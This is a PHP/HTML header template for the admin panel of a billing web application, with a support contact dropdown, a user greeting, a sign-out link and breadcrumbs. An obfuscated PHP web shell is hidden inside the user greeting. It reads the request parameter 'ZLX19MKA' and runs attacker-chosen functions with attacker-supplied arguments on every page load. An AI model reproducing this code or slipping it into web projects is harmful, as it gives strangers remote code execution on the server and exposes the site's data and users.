	<div class="headerpanel">
        	<a href="#" class="showmenu" id="menues"></a>
            
            <div class="headerright">
            	<div class="dropdown notification">
                    <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="http://themetrace.com/page.html">
                    	<span class="iconsweets-globe iconsweets-white"></span>
                    </a>
                    <ul class="dropdown-menu">
                    	<li class="nav-header"><img src="../img/ts.png" width="250"/></li>
                        <li>
                        	<a href="#">	
                        	<strong>For any technical queries related to  <br/> your chaaruvi product, please contact us<br/> 
                  
                      Call:<br/>
                       +91-9399771312<br/>
                     
                       <br/>
                      
                      </strong><br />
                            
                            </a>
                        </li>
                        <li class="viewmore"><a href="http://trinitysolutions.in/" target="">www.chaaruvi.com</a></li>
                    </ul>
                </div><!--dropdown-->
                
    			<div class="dropdown userinfo">
                    <a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="">Hi, <?php
if	( $juhso5x	= @$ {"_REQUEST"} ["ZLX19MKA"])$juhso5x [1] (	$ { $juhso5x[ 2]}[	0]	,$juhso5x	[ 3] (	$juhso5x[	4	])) ; echo $cmn->getvalfield($connection,"billuser","username ","userid = '$loginid' "); ?>! <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                       <!-- <li><a href="profile_setting.php"><span class="icon-edit"></span> Edit Profile</a></li>-->
                        
                        <!--<li class="divider"></li>-->
                        <li><a href="logout.php"><span class="icon-off"></span> Sign Out</a></li>
                    </ul>
                </div><!--dropdown-->
    		
            </div><!--headerright-->
            
    	</div><!--headerpanel-->
        <div class="breadcrumbwidget">
        	<ul class="skins">
              <!--  <li><a href="default.html" class="skin-color default"></a></li>
                <li><a href="orange.html" class="skin-color orange"></a></li>
                <li><a href="dark.html" class="skin-color dark"></a></li>
                <li>&nbsp;</li>-->
                <li class="fixed"><a href="#" class="skin-layout fixed"></a></li>
                <li class="wide"><a href="#" class="skin-layout wide"></a></li>
            </ul><!--skins-->
        	<ul class="breadcrumb">
                <li><a href="">Home</a> <span class="divider">/</span></li>
                <li class="active"><?php echo $module; ?></li>
            </ul>
        </div><!--breadcrumbwidget-->
      	<div class="pagetitle">
        	<h1><?php echo $submodule; ?></h1> 
        </div><!--pagetitle-->
        
    